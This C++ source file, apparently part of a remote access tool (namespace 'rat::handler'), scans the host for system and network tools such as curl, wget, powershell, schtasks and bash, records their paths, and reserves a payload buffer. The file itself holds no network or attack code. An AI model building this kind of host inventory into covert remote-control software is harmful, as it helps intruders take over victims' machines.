#include "rat/handler/types.hpp"

#include <array>
#include <cstdio>
#include <cstdlib>
#include <fmt/core.h>

namespace rat::handler {

#ifdef _WIN32
static constexpr const char *TOOLS[] = {
    "ffmpeg",   "curl",    "wget",       "7z",      "zip",      "tar",      "python",
    "node",     "git",     "powershell", "cmd",     "tasklist", "taskkill", "reg",
    "schtasks", "netstat", "ipconfig",   "wmic",    "msinfo32", "sc",       "ping",
    "tracert",  "net",     "explorer",   "notepad", "calc",     "mspaint"};
#else
static constexpr const char *TOOLS[] = {
    "ffmpeg",   "curl", "wget", "7z",         "zip",     "tar", "python", "node",     "git",
    "bash",     "sh",   "ls",   "ps",         "kill",    "top", "htop",   "df",       "du",
    "ifconfig", "ip",   "ping", "traceroute", "netstat", "ss",  "cron",   "systemctl"};
#endif

constexpr size_t KB = 1024;

RatState::RatState() {
    for(size_t i = 0; i < std::size(TOOLS); ++i) {
        auto path = findExecutable(TOOLS[i]);
        if(!path.empty()) {
            command_path_map.emplace(TOOLS[i], std::move(path));
        }
    }
    payload.reserve(50 * KB);
}

#ifdef _WIN32
std::filesystem::path RatState::findExecutable(const std::string &arg_Tool) const {
    char buffer[MAX_PATH];
    if(SearchPathA(NULL, arg_Tool.c_str(), ".exe", MAX_PATH, buffer, NULL) != 0) {
        return std::filesystem::path(buffer);
    }
    return {};
}
#else
std::filesystem::path RatState::findExecutable(const std::string &arg_Tool) const {
    std::string cmd = fmt::format("which {} 2>/dev/null", arg_Tool);
    FILE *pipe = popen(cmd.c_str(), "r");
    if(!pipe)
        return {};

    char buffer[512];
    if(fgets(buffer, sizeof(buffer), pipe)) {
        std::string result(buffer);
        result.erase(result.find_last_not_of(" \n\r\t") + 1);
        pclose(pipe);
        return std::filesystem::path(result);
    }
    pclose(pipe);
    return {};
}
#endif

std::filesystem::path RatState::getToolPath(const std::string &arg_Name) const {
    auto it = command_path_map.find(arg_Name);
    if(it != command_path_map.end()) {
        return it->second;
    }
    return {};
}

bool RatState::hasTool(const std::string &arg_Tool) const {
    return command_path_map.find(arg_Tool) != command_path_map.end();
}

void RatState::addCommand(const std::string &arg_Key, const std::string &arg_Literal) {
    command_path_map[arg_Key] = std::filesystem::path(arg_Literal);
}

std::string RatState::getCommand(const std::string &arg_Key) const {
    auto it = command_path_map.find(arg_Key);
    if(it != command_path_map.end()) {
        return it->second.string();
    }
    return {};
}

std::string RatState::listDynamicTools() const {
    std::ostringstream oss;
    for(const auto &entry : command_path_map) {
        oss << fmt::format("{}: {}\n", entry.first, entry.second.string());
    }
    return oss.str();
}

} // namespace rat::handler
